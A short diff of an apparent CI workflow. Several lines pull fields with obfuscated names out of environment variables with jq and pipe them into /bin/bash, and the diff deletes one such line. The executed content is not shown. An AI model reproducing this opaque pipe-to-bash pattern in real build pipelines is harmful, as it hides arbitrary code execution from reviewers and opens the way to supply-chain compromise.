@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$kmi0888" | jq -r .nmrmd6 | /bin/bash
           echo $hgw07575 | jq -r .eaxv23 | /bin/bash
           printf '%s' "$cr4" | jq -r .kvq1382 | /bin/bash
-          printf '%s' "$gxv63252" | jq -r .g7452 | /bin/bash
           echo $ptnm8885 | jq -r .qfi8 | /bin/bash
 
       - name: Upload results
